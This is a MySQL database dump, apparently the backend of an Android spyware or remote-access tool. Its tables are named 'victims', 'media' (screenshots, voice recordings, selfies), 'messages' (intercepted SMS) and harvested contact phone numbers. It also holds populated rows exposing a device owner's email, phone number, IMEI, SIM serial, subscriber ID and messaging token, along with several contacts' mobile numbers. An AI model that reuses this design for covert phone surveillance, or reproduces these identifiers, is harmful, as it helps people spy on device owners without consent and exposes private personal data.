/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `file_bundle_id` int(11) NOT NULL,
  `absolute_parent_path` text NOT NULL,
  `file_name` text NOT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `is_directory` tinyint(4) NOT NULL,
  `file_size_in_kb` int(11) NOT NULL,
  `file_hash` text NOT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  KEY `file_bundle_id` (`file_bundle_id`),
  CONSTRAINT `files_ibfk_1` FOREIGN KEY (`parent_id`) REFERENCES `files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `files_ibfk_2` FOREIGN KEY (`file_bundle_id`) REFERENCES `file_bundles` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `files`
--

LOCK TABLES `files` WRITE;
/*!40000 ALTER TABLE `files` DISABLE KEYS */;
/*!40000 ALTER TABLE `files` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `media`
--

DROP TABLE IF EXISTS `media`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `media` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `_type` enum('SCREENSHOT','VOICE','SELFIE') NOT NULL,
  `captured_at` timestamp NULL DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `media_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `media`
--

LOCK TABLES `media` WRITE;
/*!40000 ALTER TABLE `media` DISABLE KEYS */;
/*!40000 ALTER TABLE `media` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `content` text NOT NULL,
  `_type` enum('inbox','outbox') NOT NULL,
  `delivered_at` bigint(20) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `messages_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phone_numbers`
--

DROP TABLE IF EXISTS `phone_numbers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phone_numbers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `contact_id` int(11) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `phone_type` varchar(20) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `contact_id` (`contact_id`),
  CONSTRAINT `phone_numbers_ibfk_1` FOREIGN KEY (`contact_id`) REFERENCES `contacts` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phone_numbers`
--

LOCK TABLES `phone_numbers` WRITE;
/*!40000 ALTER TABLE `phone_numbers` DISABLE KEYS */;
INSERT INTO `phone_numbers` VALUES (1,42,'9447229678','MOBILE','2016-09-20 18:06:19'),(2,43,'9744911891','MOBILE','2016-09-20 18:06:19'),(3,162,'9544519350','MOBILE','2016-09-20 18:06:21'),(4,166,'9995997689','MOBILE','2016-09-20 18:06:21'),(5,167,'9633154385','MOBILE','2016-09-20 18:06:22'),(6,168,'9497872695','MOBILE','2016-09-20 18:06:22'),(7,169,'8086219477','MOBILE','2016-09-20 18:06:22'),(8,192,'04933 227 219','MOBILE','2016-09-20 18:06:22'),(9,215,'9656669021','MOBILE','2016-09-20 18:06:23'),(10,222,'123','MOBILE','2016-09-20 18:06:23'),(11,222,'6666','HOME','2016-09-20 18:06:23'),(12,222,'33333','WORK','2016-09-20 18:06:23'),(13,223,'456','MOBILE','2016-09-20 18:06:23'),(14,223,'789','HOME','2016-09-20 18:06:23'),(15,223,'999','WORK','2016-09-20 18:06:23'),(16,223,'3333','FAX_WORK','2016-09-20 18:06:23');
/*!40000 ALTER TABLE `phone_numbers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `victim_device_info_dynamic_audit`
--

DROP TABLE IF EXISTS `victim_device_info_dynamic_audit`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `victim_device_info_dynamic_audit` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `device_info_dynamic` text NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `victim_device_info_dynamic_audit_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `victim_device_info_dynamic_audit`
--

LOCK TABLES `victim_device_info_dynamic_audit` WRITE;
/*!40000 ALTER TABLE `victim_device_info_dynamic_audit` DISABLE KEYS */;
/*!40000 ALTER TABLE `victim_device_info_dynamic_audit` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `victims`
--

DROP TABLE IF EXISTS `victims`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `victims` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_code` varchar(10) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `email` varchar(150) DEFAULT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `fcm_id` text,
  `fcm_updated_at` timestamp NULL DEFAULT NULL,
  `api_key` varchar(10) NOT NULL,
  `imei` varchar(16) NOT NULL,
  `device_name` varchar(50) NOT NULL,
  `device_hash` text NOT NULL,
  `device_info_static` text NOT NULL,
  `device_info_dynamic` text NOT NULL,
  `actions` varchar(100) DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `imei` (`imei`),
  UNIQUE KEY `api_key` (`api_key`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `victims`
--

LOCK TABLES `victims` WRITE;
/*!40000 ALTER TABLE `victims` DISABLE KEYS */;
INSERT INTO `victims` VALUES (1,'TXpFVbqVAj',NULL,'shifar@rainhopes.com','8089510045','eh39rkSiQV0:APA91bEoNv0t86qO5WWvm4wdWnQWQ2WVtezxfOmTTPlyjBVLiAgvhG8cHz7WNG0Xwv1RVcdeR98EKW7PTa7-zAe_wyNGfdQBkKEcmlnxF69-02tIlG8v8ZZ-KU7Bl4OeerJ7ZPGf7wWq',NULL,'z5xJ6YC6C1','911478800901601','COOLPAD CP8676_I02','vFVqt2ZWedwCM1vTbunD8zIgIl61kpvrrCCDWcx5yA1wYOJW8M7ben6voDpQTD7H\n','Build.BOARD=unknown,Build.BOOTLOADER=unknown,Build.BRAND=Coolpad,Build.DEVICE=CP8676_I02,Build.FINGERPRINT=Coolpad/CP8676_I02/CP8676_I02:5.1/LMY47D/5.1.023.P1.151224.8676_I02:user/release-keys,Build.DISPLAY=V036,Build.HARDWARE=mt6735,Build.HOST=ubuntu,Build.ID=LMY47D,Build.PRODUCT=CP8676_I02,Build.SERIAL=FQEY69Z9HMMJSKFA,Build.getRadioVersion()=MOLY.LR9.W1444.MD.LWTG.MP.V16.P24~ 2015/09/14 10:02','NetworkCountryISO=in,NetworkOperator=40472,NetworkOperatorName=BSNL MOBILE,NetworkType=HSPA,PhoneType=TYPE_GSM,SIMCountryISO=in,SIMOperator=40472,SIMOperatorName=BSNL MOBILE,SIMSerialNumber=89917230934813765162,SIM State=5,SubscriberID=404728106376516,VoiceMailAlphaTag=Voicemail,VoiceMailNumber=-,CID=23520764,LAC=3583,PSC=-1,MMSUAProfileUrl=http://www.google.com/oha/rdf/ua-profile-kila.xml,MMSUserAgent=Android-Mms/0.1,DeviceId=911478800901601,Line1Number=-,CellLocation=[3583~23520764~-1],SoftwareVersion=78',NULL,1,'2016-09-20 18:06:18');
/*!40000 ALTER TABLE `victims` ENABLE KEYS */;
UNLOCK TABLES;
/*!50003 SET @saved_cs_client      = @@character_set_client */ ;
/*!50003 SET @saved_cs_results     = @@character_set_results */ ;
/*!50003 SET @saved_col_connection = @@collation_connection */ ;
/*!50003 SET character_set_client  = utf8 */ ;
/*!50003 SET character_set_results = utf8 */ ;
/*!50003 SET collation_connection  = utf8_general_ci */ ;
/*!50003 SET @saved_sql_mode       = @@sql_mode */ ;
/*!50003 SET sql_mode              = 'STRICT_TRANS_TABLES' */ ;
DELIMITER ;;
/*!50003 CREATE*/ /*!50017 DEFINER=`root`@`localhost`*/ /*!50003 TRIGGER after_victim_update
AFTER UPDATE ON victims
FOR EACH ROW BEGIN
  IF OLD.device_info_dynamic <> NEW.device_info_dynamic
  THEN
    INSERT INTO victim_device_info_dynamic_audit
    SET victim_id         = OLD.id,
      device_info_dynamic = OLD.device_info_dynamic;
  END IF;
END */;;
DELIMITER ;
/*!50003 SET sql_mode              = @saved_sql_mode */ ;
/*!50003 SET character_set_client  = @saved_cs_client */ ;
/*!50003 SET character_set_results = @saved_cs_results */ ;
/*!50003 SET collation_connection  = @saved_col_connection */ ;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2016-09-20 23:37:36
